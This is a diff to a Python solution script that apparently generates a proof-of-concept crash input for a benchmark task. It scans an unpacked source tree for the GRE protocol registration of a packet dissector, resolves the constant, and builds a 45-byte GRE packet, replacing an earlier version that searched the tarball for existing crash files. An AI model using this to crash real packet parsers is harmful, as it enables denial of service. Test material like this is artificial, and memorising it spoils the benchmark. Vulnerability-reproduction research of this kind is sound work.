@@ -1,135 +1,242 @@
+import os
 import tarfile
-from typing import Optional, Tuple
+import zipfile
+import tempfile
+import re
+import shutil
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = self._extract_poc_from_tar(src_path)
-        if poc is not None:
-            return poc
-        return self._fallback_poc()
+        project_root = self._extract_src(src_path)
+        # Collect numeric definitions (macros and enums)
+        macros_int, macros_expr, enums_int = self._collect_numeric_definitions(project_root)
+        # Find gre.proto registration token
+        gre_proto_token = self._find_gre_proto_token(project_root)
+        proto_value = None
+        if gre_proto_token is not None:
+            proto_value = self._eval_constant_token(
+                gre_proto_token, macros_int, macros_expr, enums_int
+            )
+        if proto_value is None:
+            # Fallback to common GRE 802.11 Ethertype used in Wireshark
+            # This value is used only if static analysis fails completely.
+            proto_value = 0x6558
+        poc = self._build_poc(proto_value, length=45)
+        return poc
 
-    def _extract_poc_from_tar(self, src_path: str) -> Optional[bytes]:
-        try:
-            tar = tarfile.open(src_path, "r:*")
-        except Exception:
-            return None
+    # ---------------- Extraction helpers ----------------
 
-        best_data: Optional[bytes] = None
-        best_key: Optional[Tuple[int, int, int]] = None
-        target_len = 45
+    def _extract_src(self, src_path: str) -> str:
+        # If src_path is already a directory, just use it
+        if os.path.isdir(src_path):
+            return src_path
 
-        try:
-            for member in tar.getmembers():
-                if not member.isfile():
-                    continue
+        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
+        if tarfile.is_tarfile(src_path):
+            with tarfile.open(src_path, "r:*") as tf:
+                tf.extractall(tmpdir)
+        elif zipfile.is_zipfile(src_path):
+            with zipfile.ZipFile(src_path, "r") as zf:
+                zf.extractall(tmpdir)
+        else:
+            # Unknown format: try to copy as directory if possible
+            raise ValueError("Unsupported src_path format")
 
-                size = member.size
-                # Skip empty or very large files
-                if size <= 0 or size > 65536:
-                    continue
+        # If there's a single top-level directory, use it as project root
+        entries = [e for e in os.listdir(tmpdir) if not e.startswith(".")]
+        if len(entries) == 1:
+            root = os.path.join(tmpdir, entries[0])
+            if os.path.isdir(root):
+                return root
+        return tmpdir
 
-                name_lower = member.name.lower()
-                priority = 0
+    # ---------------- Source scanning helpers ----------------
 
-                # Path / name-based hints
-                if "/poc" in name_lower or name_lower.startswith("poc"):
-                    priority += 50
-                if "poc" in name_lower:
-                    priority += 50
-                if "crash" in name_lower or "repro" in name_lower:
-                    priority += 40
-                if "id:" in name_lower or "id_" in name_lower:
-                    priority += 35
-                if "afl" in name_lower or "fuzz" in name_lower:
-                    priority += 10
-                if "test" in name_lower or "tests" in name_lower:
-                    priority += 5
-                if (
-                    "input" in name_lower
-                    or "packet" in name_lower
-                    or "seed" in name_lower
-                    or "pcap" in name_lower
-                ):
-                    priority += 20
-                if name_lower.endswith(
-                    (".pcap", ".pcapng", ".cap", ".bin", ".dat", ".pkt")
-                ):
-                    priority += 30
+    def _iter_source_files(self, root: str):
+        exts = {".c", ".h", ".cc", ".cpp", ".cxx"}
+        for dirpath, dirnames, filenames in os.walk(root):
+            for fname in filenames:
+                _, ext = os.path.splitext(fname)
+                if ext.lower() in exts:
+                    yield os.path.join(dirpath, fname)
 
-                try:
-                    f = tar.extractfile(member)
-                except Exception:
-                    continue
-                if f is None:
-                    continue
+    def _collect_numeric_definitions(self, root: str):
+        macros_int = {}
+        macros_expr = {}
+        enums_int = {}
 
-                try:
-                    data = f.read()
-                except Exception:
-                    continue
+        define_pattern = re.compile(
+            r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+)$", re.MULTILINE
+        )
+        enum_pattern = re.compile(
+            r"enum\s+[A-Za-z_][A-Za-z0-9_]*\s*{([^}]+)};", re.DOTALL
+        )
 
-                if not data:
-                    continue
-
-                # Determine if file is binary-like
-                text_chars = set(range(0x20, 0x7F))
-                text_chars.update({7, 8, 9, 10, 12, 13, 27})
-                nontext = sum(1 for b in data if b not in text_chars)
-                is_binary = nontext > 0
-                if is_binary:
-                    priority += 10
-
-                # PCAP magic numbers
-                if len(data) >= 4 and data[:4] in (
-                    b"\xd4\xc3\xb2\xa1",
-                    b"\xa1\xb2\xc3\xd4",
-                    b"\x4d\x3c\xb2\xa1",
-                    b"\xa1\xb2\x3c\x4d",
-                ):
-                    priority += 40
-
-                diff = abs(size - target_len)
-                # Higher priority first, then closer to target length, then smaller size
-                key = (priority, -diff, -size)
-
-                if best_key is None or key > best_key:
-                    best_key = key
-                    best_data = data
-        finally:
+        for path in self._iter_source_files(root):
             try:
-                tar.close()
-            except Exception:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    text = f.read()
+            except OSError:
+                continue
+
+            # Macros
+            for m in define_pattern.finditer(text):
+                name = m.group(1)
+                val_str = m.group(2)
+                # Remove comments
+                val_str = val_str.split("/*", 1)[0].split("//", 1)[0].strip()
+                if not val_str:
+                    continue
+                macros_expr.setdefault(name, val_str)
+                nums = re.findall(r"0x[0-9A-Fa-f]+|\d+", val_str)
+                if len(nums) == 1:
+                    try:
+                        macros_int[name] = int(nums[0], 0)
+                    except ValueError:
+                        pass
+
+            # Enums with explicit values
+            for em in enum_pattern.finditer(text):
+                body = em.group(1)
+                for entry in body.split(","):
+                    entry = entry.strip()
+                    if not entry:
+                        continue
+                    m = re.match(
+                        r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+)", entry, re.DOTALL
+                    )
+                    if not m:
+                        continue
+                    name = m.group(1)
+                    val_str = m.group(2)
+                    val_str = val_str.split("/*", 1)[0].split("//", 1)[0].strip()
+                    if not val_str:
+                        continue
+                    nums = re.findall(r"0x[0-9A-Fa-f]+|\d+", val_str)
+                    if len(nums) == 1:
+                        try:
+                            enums_int[name] = int(nums[0], 0)
+                        except ValueError:
+                            pass
+
+        return macros_int, macros_expr, enums_int
+
+    def _find_gre_proto_token(self, root: str):
+        # Search for dissector_add_uint("gre.proto", <token>, ...)
+        pattern = re.compile(
+            r"dissector_add_uint\s*\(\s*\"gre\.proto\"\s*,\s*([^,]+),", re.DOTALL
+        )
+        for path in self._iter_source_files(root):
+            try:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    text = f.read()
+            except OSError:
+                continue
+            if "gre.proto" not in text:
+                continue
+            m = pattern.search(text)
+            if m:
+                token = m.group(1).strip()
+                return token
+        return None
+
+    # ---------------- Constant evaluation helpers ----------------
+
+    def _eval_identifier(
+        self,
+        name: str,
+        macros_int: dict,
+        macros_expr: dict,
+        enums_int: dict,
+        depth: int = 0,
+    ):
+        if name in macros_int:
+            return macros_int[name]
+        if name in enums_int:
+            return enums_int[name]
+        if depth > 5:
+            return None
+        expr = macros_expr.get(name)
+        if not expr:
+            return None
+        tokens = re.findall(
+            r"0x[0-9A-Fa-f]+|\d+|[A-Za-z_][A-Za-z0-9_]*", expr
+        )
+        nums = [t for t in tokens if t[0].isdigit() or t.startswith("0x")]
+        ids = [t for t in tokens if t[0].isalpha() or t[0] == "_"]
+        if len(nums) == 1 and not ids:
+            try:
+                val = int(nums[0], 0)
+            except ValueError:
+                return None
+            macros_int[name] = val
+            return val
+        # If it's an alias to another identifier
+        for other in ids:
+            if other == name:
+                continue
+            val = self._eval_identifier(
+                other, macros_int, macros_expr, enums_int, depth + 1
+            )
+            if val is not None:
+                macros_int[name] = val
+                return val
+        return None
+
+    def _eval_constant_token(
+        self,
+        token: str,
+        macros_int: dict,
+        macros_expr: dict,
+        enums_int: dict,
+    ):
+        token = token.strip()
+        # Remove surrounding parentheses
+        while token.startswith("(") and token.endswith(")"):
+            inner = token[1:-1].strip()
+            if not inner:
+                break
+            token = inner
+
+        parts = re.findall(
+            r"0x[0-9A-Fa-f]+|\d+|[A-Za-z_][A-Za-z0-9_]*", token
+        )
+        nums = [t for t in parts if t[0].isdigit() or t.startswith("0x")]
+        ids = [t for t in parts if t[0].isalpha() or t[0] == "_"]
+
+        if len(nums) == 1 and not ids:
+            try:
+                return int(nums[0], 0)
+            except ValueError:
                 pass
 
-        return best_data
+        if len(nums) == 1:
+            # Likely a cast like (guint16)0x6558
+            try:
+                return int(nums[0], 0)
+            except ValueError:
+                pass
 
-    def _fallback_poc(self) -> bytes:
-        # Construct a 45-byte PCAP file with a tiny packet as a generic fallback
-        hdr = bytearray()
+        for name in ids:
+            val = self._eval_identifier(name, macros_int, macros_expr, enums_int, 0)
+            if val is not None:
+                return val
 
-        # Global header (24 bytes, little-endian)
-        hdr += b"\xd4\xc3\xb2\xa1"  # magic number
-        hdr += b"\x02\x00"          # version major
-        hdr += b"\x04\x00"          # version minor
-        hdr += b"\x00\x00\x00\x00"  # thiszone
-        hdr += b"\x00\x00\x00\x00"  # sigfigs
-        hdr += b"\xff\xff\x00\x00"  # snaplen
-        hdr += b"\x01\x00\x00\x00"  # network (Ethernet)
+        return None
 
-        # Packet header (16 bytes)
-        hdr += b"\x00\x00\x00\x00"  # ts_sec
-        hdr += b"\x00\x00\x00\x00"  # ts_usec
-        hdr += b"\x05\x00\x00\x00"  # incl_len = 5
-        hdr += b"\x05\x00\x00\x00"  # orig_len = 5
+    # ---------------- PoC construction ----------------
 
-        # Packet data (5 bytes) - minimal GRE-like header + 1 byte payload
-        hdr += b"\x00\x00\x00\x00\x00"
-
-        # Ensure exact length of 45 bytes
-        if len(hdr) < 45:
-            hdr += b"\x00" * (45 - len(hdr))
-        elif len(hdr) > 45:
-            hdr = hdr[:45]
-
-        return bytes(hdr)
+    def _build_poc(self, proto_value: int, length: int = 45) -> bytes:
+        if length < 4:
+            length = 4
+        b = bytearray(length)
+        # GRE flags and version: 0x0000 (no options, version 0)
+        b[0] = 0x00
+        b[1] = 0x00
+        # Protocol field: network byte order (big-endian)
+        proto_value &= 0xFFFF
+        b[2] = (proto_value >> 8) & 0xFF
+        b[3] = proto_value & 0xFF
+        # Remaining bytes left as zero
+        return bytes(b)
